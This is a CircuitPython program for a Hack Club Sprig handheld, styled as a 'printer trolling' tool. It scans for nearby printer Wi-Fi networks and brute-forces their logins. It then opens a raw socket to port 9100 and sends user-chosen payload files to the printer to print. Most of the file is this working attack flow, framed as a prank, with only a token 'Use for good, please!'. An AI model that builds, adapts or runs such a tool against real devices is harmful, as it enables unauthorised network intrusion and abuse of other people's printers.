from time import sleep as wait  # hi lua kiddie here
from sprig import Sprig
from network import Network
from microcontroller import reset
from sys import stdin
from os import listdir
from wifi import radio
from socketpool import SocketPool

nw = Network()
printers = []
sprig = Sprig()  # terminal uses a 26x8 viewport, giving us 208 characters
sprig.reset_display()

# Intro
sprig.set_title("POPBOB PRINTER 0.1.1")
print("Created by geschmit")
print("haha printer funny")
wait(1.5)
sprig.reset_display()

menu = "MAIN MENU"
target = None
payload = None
while True:
    # Payload menu
    if menu == "MAIN MENU":
        menu = sprig.selection_screen([
            "SCAN MENU",
            "SELECTION MENU",
            "ATTACK MENU",
            "REBOOT DEVICE",
            "EXIT TO CPY CONS",
            "ABOUT"
        ], "MAIN MENU")

    # Scan menu
    elif menu == "SCAN MENU":
        selection = sprig.selection_screen([
            "SCAN NEARBY",
            "RETURN TO MAIN"
        ], "SCAN MENU")
        if selection == "RETURN TO MAIN":
            menu = "MAIN MENU"
            continue
        elif selection == "SCAN NEARBY":
            print("\x1b[5;0HPRINTERS DETECTED:")
            sprig.ledLeft.value = True
            printers = nw.fetch_printers()
            sprig.ledLeft.value = False
            print(len(printers) == 0 and "NONE" or len(printers))
            sprig.poll_input()

    # Selection menu
    elif menu == "SELECTION MENU":
        selection = sprig.selection_screen([
            "PAYLOAD",
            "DEVICE",
            "RETURN TO MAIN"
        ], "SCAN MENU")
        if selection == "RETURN TO MAIN":
            menu = "MAIN MENU"
        else:
            menu = selection

    elif menu == "PAYLOAD":
        sprig.set_title("PAYLOAD SELECTION")
        prtList = []
        lsdir = listdir("./payloads/")
        for i in lsdir:
            if lsdir.index(i) > 7:
                continue
            else:
                ind = i[0:(len(i) > 26 and 26 or len(i))]
                prtList.append(ind)

        prtList.append("RETURN")
        selection = sprig.selection_screen(prtList, "PAYLOAD MENU")
        if selection == "RETURN":
            menu = "SELECTION MENU"
        else:
            payload = lsdir[prtList.index(selection)]
            sprig.reset_display(reset_title=False)
            print(f"USING PAYLOAD:\n{payload}")
            sprig.poll_input()

    elif menu == "DEVICE":
        sprig.set_title("DEVICE SELECTION")
        if len(printers) == 0:
            sprig.reset_display(reset_title=False)
            print("No devices were found!")
            print("Please scan again via\nthe scan menu.")
            sprig.poll_input()
            menu = "MAIN MENU"
            continue
        else:
            prtList = []
            for i in printers:
                if printers.index(i) > 7:
                    # should technically fix this, but there isn't likely to be
                    # this many printers around us at a time regardless
                    continue
                else:
                    ssid = i.ssid[10:-1]
                    ssid = ssid[0:(len(ssid) > 26 and 26 or len(ssid))]
                    prtList.append(ssid)

            prtList.append("RETURN")
            selection = sprig.selection_screen(prtList, "SCAN MENU")
            if selection == "RETURN":
                menu = "SELECTION MENU"
            else:
                target = printers[prtList.index(selection)]
                sprig.reset_display(reset_title=False)
                print(f"USING PRINTER:\n{target.ssid[10:-1]}")
                sprig.poll_input()

    # Attack menu
    elif menu == "ATTACK MENU":
        sprig.set_title("ATTACK MENU")
        if not target or not payload:
            sprig.reset_display(reset_title=False)
            print("You need to set a target\nand/or payload first!")
            sprig.poll_input()
            menu = "MAIN MENU"
            continue
        
        selection = sprig.selection_screen([
            ":9100 ATTACK",
            "RETURN TO MAIN"
        ], "ATTACK MENU")
        if selection == "RETURN TO MAIN":
            menu = "MAIN MENU"
        elif selection == ":9100 ATTACK":
            sprig.reset_display()
            sprig.set_title("TROLLING IN PROGRESS")
            print("Attempting network\nconnection...")
            response = nw.bruteforce_logins(target)
            if not response:
                print("Failed to connect.")
                sprig.poll_input()
                continue

            sp = SocketPool(radio) # pyright:ignore
            sck = sp.socket()
            print("Connected to network!")
            print(f"Printer IP: {radio.ipv4_gateway}")    
            print("Trying connection to :9100...")
            try:
                sck.connect(("192.168.223.1",9100))
            except:
                print("Failed to connect to socket.\nThis printer most likely\nhas :9100 disabled.")
                radio.enabled = False
                sprig.poll_input()
                continue
            finally:
                print("Connected to port!")
                print("Sending payload...")
                with open(f"/payloads/{payload}") as a:
                    for line in a:
                        sck.send(line.replace("\n","\r\n"))
                    a.close()
                    sck.close()
                
                print("Trollage complete.")
                print("(hopefully)")
                radio.enabled = False
                sprig.poll_input()
                continue

    # Utils + credits
    elif menu == "REBOOT DEVICE":
        sprig.reset_display()
        reset()

    elif menu == "EXIT TO CPY CONS":
        # just a little something so I can program this on the go
        radio.start_ap("hp_troller","trollerman")
        break

    elif menu == "ABOUT":
        sprig.reset_display()
        sprig.set_title("ABOUT")
        print("""POBBOB PRINTER 0.1.1
Created by geschmit.
Licensed under GPL v3.0.
Use for good, please!

"Sprig" is created by 
Hack Club, go check them 
out! (hackclub.com)
""")
        sprig.poll_input()
        menu = "MAIN MENU"

sprig.reset_display()